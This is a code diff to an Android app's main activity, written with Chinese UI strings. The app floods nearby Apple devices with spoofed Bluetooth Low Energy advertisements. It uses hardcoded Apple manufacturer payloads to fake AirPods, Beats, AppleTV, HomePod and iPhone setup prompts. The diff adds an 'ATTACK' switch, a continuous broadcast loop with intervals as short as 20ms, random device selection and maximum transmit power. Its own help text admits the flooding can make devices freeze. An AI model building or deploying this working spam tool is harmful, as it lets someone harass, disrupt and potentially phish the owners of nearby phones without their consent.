@@ -21,25 +21,29 @@ import android.icu.util.Calendar;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.ParcelUuid;
+import android.text.method.ScrollingMovementMethod;
 import android.util.Log;
 import android.view.View;
 import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
+import android.widget.CompoundButton;
 import android.widget.EditText;
 import android.widget.Spinner;
+import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.content.Intent;
 
 import java.nio.charset.Charset;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.UUID;
+import java.util.Random;
 
 public class MainActivity extends AppCompatActivity {
-    Button btn_Atttack,btn_help;
-    TextView tv_advNum;
-    Spinner sp_SelectDevice = null;
+
     private BluetoothLeAdvertiser bluetoothLeAdvertiser;
     private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
     public byte[][] deviceData = {
@@ -61,10 +65,8 @@ public class MainActivity extends AppCompatActivity {
             {0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
             {0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x01, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x06, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x20, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x2b, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, (byte)0xc0, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x0d, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x13, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x27, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
@@ -73,104 +75,196 @@ public class MainActivity extends AppCompatActivity {
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x02, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
             {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x1e, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
     };
+    //private byte[][] testData = {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}};
     private String[] deviceNameArr = {
-            "1.AirPods",
-            "2.AirPods Pro",
-            "3.AirPods Max",
-            "4.AirPods",
-            "5.AirPods",
-            "6.AirPods Pro",
-            "7.Powerbeats3",
-            "8.Powerbeats Pro",
-            "9.Beats Solo Pro",
-            "10.Beats Studio Buds",
-            "11.Beats Flex",
-            "12.BeatsX",
-            "13.Beats Solo3",
-            "14.Beats Studio3",
-            "15.Beats Studio Pro",
-            "16.Beats Fit Pro",
-            "17.Beats Studio Buds +",
-            "18.设置AppleTV",
-            "19.无作用",
-            "20.配对AppleTV",
-            "21.AppleTV 验证AppleID",
-            "22.无作用",
-            "23.AppleTV 隔空投放和HomeKit",
-            "24.AppleTV键盘",
-            "25.正在连接AppleTV",
-            "26.HomePod",
-            "27.设置新iPhone",
-            "28.转移手机号码",
-            "29.测量TV色彩平衡"
+            "AirPods",
+            "AirPods Pro",
+            "AirPods Max",
+            "AirPods",
+            "AirPods",
+            "AirPods Pro",
+            "Powerbeats3",
+            "Powerbeats Pro",
+            "Beats Solo Pro",
+            "Beats Studio Buds",
+            "Beats Flex",
+            "BeatsX",
+            "Beats Solo3",
+            "Beats Studio3",
+            "Beats Studio Pro",
+            "Beats Fit Pro",
+            "Beats Studio Buds +",
+            "设置AppleTV",
+            "配对AppleTV",
+            "AppleTV 验证AppleID",
+            "AppleTV 隔空投放和HomeKit",
+            "AppleTV键盘",
+            "正在连接AppleTV",
+            "HomePod",
+            "设置新iPhone",
+            "转移手机号码",
+            "测量TV色彩平衡"
     };
-    private int spIndex=0;
-    private int advertisingTimes=1;
-    // 蓝牙权限列表
+    private String[] advModeName = {
+            "低功耗模式 1000ms延迟",
+            "平衡模式 250ms延迟",
+            "低延迟模式 100ms延迟"
+    };
+    private int advMode = 2;
+    private String[] txModeName = {
+            "超低功率发送模式 广播距离最近",
+            "低功率发送模式 广播距离近",
+            "中功率发送模式 广播距离中",
+            "高功率发送模式 广播距离远"
+    };
+    private int txMode = 3;
+    private String helpString = "\n程序功能介绍：\n\n随机设备：从27个设备中随机抽取。\n\n发包间隔时间：每次发送广播包的间隔时间，最低20ms。\n\n广播包超时时间：设置单个广播包持续广播的时间，最长为180000ms，设置为0即无时间限制，需要调用stopAdv()才能停止，这样会因为之前的广播包始终存在而导致无法发送更多广播包。建议值：1000ms\n\n广播包模式：控制广播包的延迟\n\n广播包发送功率：控制广播包发送范围\n\n该工具仅用于学习和交流使用，作者不承担用户使用该工具的任何后果。";
+    private int spIndex = 0;
+    private boolean deviceIsRandom = false;
+    private boolean isStopThread = false;
+    private int intervalDelay = 1000;
+    private int advTimeout = 1000;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        Spinner sp_SelectDevice = null;
+        Spinner sp_advMode = null;
+        Spinner sp_txMode = null;
+
         sp_SelectDevice = findViewById(R.id.sp_SelectDevice);
-        Button btn_Attack = findViewById(R.id.btn_Attack);
+        sp_advMode = findViewById(R.id.sp_AdvMode);
+        sp_txMode = findViewById(R.id.sp_TxMode);
+
+        Switch sw_ATTACK = findViewById(R.id.sw_ATTACK);
+        Switch sw_RandomDevice = findViewById(R.id.sw_RandomDevice);
         Button btn_help = findViewById(R.id.btn_help);
         TextView tv_Debug = findViewById(R.id.tv_Debug);
+        EditText et_Timeout = findViewById(R.id.et_Timeout);
+        EditText et_Interval = findViewById(R.id.et_Interval);
 
-        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,deviceNameArr);
-        sp_SelectDevice.setAdapter(adapter);
+        Spinner devSpinner = findViewById(R.id.sp_SelectDevice);
+        Spinner advModeSpinner = findViewById(R.id.sp_AdvMode);
+        Spinner txModeSpinner = findViewById(R.id.sp_TxMode);
+
+
+        Random random = new Random(100);
+        tv_Debug.setMovementMethod(ScrollingMovementMethod.getInstance());
+
+
+        ArrayAdapter<String> devAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,deviceNameArr);
+        sp_SelectDevice.setAdapter(devAdapter);
         sp_SelectDevice.setSelection(0);
-        //sp_SelectDevice.setOnItemClickListener(this);
+
+        ArrayAdapter<String> advModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,advModeName);
+        sp_advMode.setAdapter(advModeAdapter);
+        sp_advMode.setSelection(2);
+
+        ArrayAdapter<String> txModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,txModeName);
+        sp_txMode.setAdapter(txModeAdapter);
+        sp_txMode.setSelection(3);
 
         bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
+
+        String patten = "HH:mm:ss.SSS";
+        SimpleDateFormat format = new SimpleDateFormat(patten);
+
+        tv_Debug.append(helpString);
 
         btn_help.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                tv_Debug.append("广播包数量：一次发送n个广播包，广播包数量过少会导致较远的设备无法接收到广播包，过多可能会导致设备卡死。\n" +
-                        "\n该工具仅用于学习和交流使用，作者不承担用户使用该工具的任何后果，使用该软件表示用户同意此协议。");
+                tv_Debug.append(helpString);
+                //startAdv(testData[0]);
             }
         });
-        btn_Attack.setOnClickListener(new View.OnClickListener() {
-            @SuppressLint("MissingPermission")
+        sw_RandomDevice.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
             @Override
-            public void onClick(View v) {
-                tv_Debug.setText("");
-                Calendar calendar = Calendar.getInstance();
-                int hour = calendar.get(Calendar.HOUR_OF_DAY);
-                int minute = calendar.get(Calendar.MINUTE);
-                int second = calendar.get(Calendar.SECOND);
-                tv_Debug.append("当前时间："+hour+":"+minute+":"+second+"\n");
-
-                Spinner spinner = findViewById(R.id.sp_SelectDevice);
-                spIndex = spinner.getSelectedItemPosition();
-                EditText editText = findViewById(R.id.et_Times);
-                advertisingTimes = Integer.parseInt(editText.getText().toString());
-
-
-                tv_Debug.append("正在检查蓝牙功能……\n");
-                if (bluetoothAdapter == null) {
-                    tv_Debug.append("您的设备不支持蓝牙功能！\n");
-                    return;
-                } else {
-                    tv_Debug.append("蓝牙功能正常\n");
+            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
+                if(isChecked == true){
+                    deviceIsRandom = true;
                 }
-                tv_Debug.append("正在检查蓝牙是否已启用……\n");
-                //2.检查蓝牙是否已经启用
-                if (bluetoothAdapter.isEnabled()) {
-                    tv_Debug.append("蓝牙已启用\n");
-                    if(bluetoothAdapter.isMultipleAdvertisementSupported()) {
-                        tv_Debug.append("当前选中的假设备："+deviceNameArr[spIndex]+"\n");
-                        tv_Debug.append("广播包数量："+advertisingTimes+"\n");
-                        tv_Debug.append("正在发送广播包……\n");
-                        for(int i=0;i<advertisingTimes;i++) {
-                            startAdv(getDevice(deviceData, spIndex));
-                        }
-                    }else{
-                        tv_Debug.append("您的设备不支持Advertisement功能！\n");
+                else{
+                    deviceIsRandom = false;
+                }
+            }
+        });
+        sw_ATTACK.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
+            @Override
+            @SuppressLint("MissingPermission")
+            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
+                if (isChecked == true) {
+                    isStopThread = false;
+                    tv_Debug.setText("");
+                    tv_Debug.append("正在进行各项检测");
+                    tv_Debug.append(".");
+                    if (bluetoothAdapter == null) {
+                        tv_Debug.append("\n您的设备不支持蓝牙功能！\n");
+                        sw_ATTACK.setChecked(false);
+                        return;
+                    } else {
                     }
-                } else {
-                    tv_Debug.append("蓝牙已关闭\n请打开蓝牙后重试\n");
+                    tv_Debug.append(".");
+                    if (bluetoothAdapter.isEnabled()) {
+                    } else {
+                        tv_Debug.append("\n蓝牙已关闭\n请打开蓝牙后重试\n");
+                        sw_ATTACK.setChecked(false);
+                        return;
+                    }
+                    tv_Debug.append(".");
+                    if (!(bluetoothAdapter.isOffloadedFilteringSupported() ||
+                            bluetoothAdapter.isOffloadedScanBatchingSupported() ||
+                            bluetoothAdapter.isMultipleAdvertisementSupported())) {
+                        tv_Debug.append("\n您的设备不支持BLE广播功能！\n");
+                        sw_ATTACK.setChecked(false);
+                        return;
+                    }
+                    tv_Debug.append("\n检测完毕，功能正常！\n");
+                    tv_Debug.append("正在获取蓝牙权限...\n");
+                    if (bluePermission()) {
+                        new Thread(new Runnable() {
+                            @Override
+                            public void run() {
+                                while (true) {
+                                    try {
+                                        intervalDelay = Integer.parseInt(et_Interval.getText().toString());
+                                        if(intervalDelay<20){
+                                            tv_Debug.append("\n发包间隔时间不能低于20ms！已将其设置为20ms\n");
+                                            et_Interval.setText("20");
+                                            intervalDelay=20;
+                                        }
+                                        advTimeout = Integer.parseInt(et_Timeout.getText().toString());
+                                        if (deviceIsRandom) {
+                                            spIndex = random.nextInt(26);
+                                        } else {
+                                            spIndex = devSpinner.getSelectedItemPosition();
+                                        }
+                                        advMode = advModeSpinner.getSelectedItemPosition();
+                                        txMode = txModeSpinner.getSelectedItemPosition();
+                                        tv_Debug.append("[" + intervalDelay + "ms]" + "@" + format.format(new Date()) + " \t");
+                                        tv_Debug.append(deviceNameArr[spIndex] + "\n");
+                                        startAdv(getDevice(deviceData, spIndex));
+                                        Thread.sleep(intervalDelay);
+                                        if (isStopThread) {
+                                            stopAdv();
+                                            break;
+                                        }
+                                    } catch (InterruptedException e) {
+                                        throw new RuntimeException(e);
+                                    }
+                                }
+                            }
+                        }).start();
+                    }else {
+                        tv_Debug.append("请授权后重试\n");
+                        sw_ATTACK.setChecked(false);
+                    }
+                }
+                else {
+                    String str = tv_Debug.getText().toString();
+                    tv_Debug.setText("广播已停止\n\n"+str);
+                    isStopThread = true;
                 }
             }
         });
@@ -180,6 +274,7 @@ public class MainActivity extends AppCompatActivity {
         return selected;
     }
     private boolean bluePermission(){
+        Log.e( "BLE","Requesting Bluetooth Permission...");
             if (ContextCompat.checkSelfPermission(this,
                     "android.permission.BLUETOOTH_SCAN")
                     != PERMISSION_GRANTED
@@ -208,7 +303,6 @@ public class MainActivity extends AppCompatActivity {
                         "android.permission.BLUETOOTH_ADMIN"}, 1);
                 return false;
             }
-
         return true;
     }
     @Override
@@ -217,42 +311,64 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == 1) {
             if (grantResults[0] == PERMISSION_GRANTED) {
             } else {
-                Toast.makeText(this, "需要蓝牙权限！", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "程序需要获取权限！", Toast.LENGTH_SHORT).show();
             }
         }
     }
-
+    @SuppressLint("MissingPermission")
+    private void stopAdv(){
+        AdvertiseCallback advertisingCallback = new AdvertiseCallback() {
+            @Override
+            public void onStartSuccess(AdvertiseSettings settingsInEffect) {
+                super.onStartSuccess(settingsInEffect);
+                Log.e( "BLE", "Advertising State: " + settingsInEffect);
+            }
+            @Override
+            public void onStartFailure(int errorCode) {
+                super.onStartFailure(errorCode);
+                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
+            }
+        };
+        if (bluePermission()) {
+            bluetoothLeAdvertiser.stopAdvertising(advertisingCallback);
+        }
+    }
     @SuppressLint("MissingPermission")
     public void startAdv(byte[] data){
-
         AdvertiseSettings settings = new AdvertiseSettings.Builder()
-                .setAdvertiseMode( AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY )
-                .setTxPowerLevel( AdvertiseSettings.ADVERTISE_TX_POWER_HIGH )
+                .setAdvertiseMode( advMode )
+                .setTxPowerLevel( txMode )
                 .setConnectable( false )
+                .setTimeout(advTimeout)
                 .build();
-
         AdvertiseData Data = new AdvertiseData.Builder()
-                .setIncludeDeviceName( false)
+                .setIncludeDeviceName(false)
+                .setIncludeTxPowerLevel(false)
                 .addManufacturerData(0x004c,data)
+                .build();
+        AdvertiseData scanData = new AdvertiseData.Builder()
+                .setIncludeTxPowerLevel(true)
+                .setIncludeDeviceName(true)
                 .build();
         AdvertiseCallback advertisingCallback = new AdvertiseCallback() {
             @Override
             public void onStartSuccess(AdvertiseSettings settingsInEffect) {
                 super.onStartSuccess(settingsInEffect);
+                Log.e( "BLE", "Advertising State: " + settingsInEffect );
             }
             @Override
             public void onStartFailure(int errorCode) {
-                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
                 super.onStartFailure(errorCode);
+                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
             }
         };
         if (bluePermission()) {
-            Log.d("BLE","Send Successful!");
+            Log.d("BLE","Advertising Successful!");
             bluetoothAdapter.setName("AirPods");
-            bluetoothLeAdvertiser.startAdvertising(settings, Data, advertisingCallback);
+            bluetoothLeAdvertiser.startAdvertising(settings, Data, scanData, advertisingCallback);
         } else {
-            Toast.makeText(this, "ERR01-需要授权才能启动蓝牙", Toast.LENGTH_SHORT).show();
+            Log.d("BLE","Advertising Failed! Need Permission.");
+            Toast.makeText(this, "程序需要获取权限！", Toast.LENGTH_SHORT).show();
         }
     }
-
 }
